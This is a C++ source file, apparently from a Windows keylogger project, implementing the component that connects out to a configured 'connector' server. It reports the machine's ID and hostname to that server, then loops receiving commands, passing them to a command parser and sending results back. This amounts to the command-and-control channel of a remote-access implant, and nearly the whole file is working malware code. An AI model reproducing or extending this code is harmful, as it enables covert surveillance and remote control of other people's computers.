#include "stdafx.h"
#include "SocketServer.h"

#include "Keylogger.h"
#include "helpers/ComputerInfoHelper.h"
#include "services/CommandParser.h"
#include "helpers/StringHelper.h"
#include "helpers/Configuration.h"
#include "helpers/AppData.h"

SocketServer::SocketServer() { }

SocketServer::~SocketServer() {
	close(this->serverSocket);
}

void SocketServer::start() {
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		std::cerr << "WSAStartup failed: " << result << "\n";
		return;
	}

	struct addrinfo* addr = nullptr;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	hints.ai_flags = AI_PASSIVE;

	auto connectorAddress = StringHelper::ws2s(Configuration::ConnectorAddress);
	auto connectorPort = StringHelper::ws2s(Configuration::ConnectorPort);
	result = getaddrinfo(connectorAddress.c_str(), connectorPort.c_str(), &hints, &addr);

	if (result != 0) {
		std::cerr << "Can't find this address. Error code: " << result << "\n";
		WSACleanup();
		return;
	}

	// Connect to connector socket

	serverSocket = socket(addr->ai_family, addr->ai_socktype,
		addr->ai_protocol);

	if (serverSocket == INVALID_SOCKET) {
		std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
		freeaddrinfo(addr);
		WSACleanup();
		return;
	}

	int connectResult = connect(serverSocket, addr->ai_addr, (int)addr->ai_addrlen);
	if (connectResult == SOCKET_ERROR) {
		std::cerr << "Can't find socket on this address. Error code: " << WSAGetLastError() << "\n";
		serverSocket = INVALID_SOCKET;
		WSACleanup();
		return;
	}

	if (serverSocket == INVALID_SOCKET) {
		std::cerr << "Error at socket: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	int requestResult;
	std::string request;
	wchar_t responseBuffer[SOCKET_BUFFER_SIZE];
	std::wstring response;
	int receivedSize;

	// Send welcome message for connector

	auto message = AppData::getInstance().ComputerId + L" " + ComputerInfoHelper::getInstance()->getHostName();
	request = StringHelper::ws2s(message);

	requestResult = send(serverSocket, request.c_str(), request.size(), 0);
	if (requestResult == SOCKET_ERROR) {
		std::wcout << L"Error connecting to server";
	}

	receivedSize = recv(serverSocket, (char*)responseBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);

	if (receivedSize == SOCKET_ERROR) {
		std::cerr << "recv failed: " << receivedSize << std::endl;
	} else if (receivedSize == 0) {
		std::cerr << "connection closed..." << std::endl;
	} else if (receivedSize > 0) {
		responseBuffer[receivedSize / 2] = '\0';
		response = std::wstring(responseBuffer);
		std::wcout << L"received: " << response << std::endl;

		if (response != L"ok") {
			std::cerr << "Server haven't confirm connection";
		}
	}

	// Listen for messages from connector
	while (true) {
		receivedSize = recv(serverSocket, (char*)responseBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);

		if (receivedSize == SOCKET_ERROR) {
			std::cerr << "recv failed: " << receivedSize << std::endl;
			break;
		} else if (receivedSize == 0) {
			std::cerr << "connection closed..." << std::endl;
		} else if (receivedSize > 0) {
			responseBuffer[receivedSize / 2] = '\0';
			response = std::wstring(responseBuffer);
			std::wcout << L"received: " << response << std::endl;

			auto responseResult = this->getResponse(response);

			int sendResult = send(serverSocket, (char*)responseResult.c_str(),
				sizeof(wchar_t) * responseResult.size(), 0);

			if (sendResult == SOCKET_ERROR) {
				std::cerr << "send failed: " << WSAGetLastError() << std::endl;
			}
		}
	}
}

std::wstring SocketServer::getResponse(std::wstring request) {
	return CommandParser::act(request);
}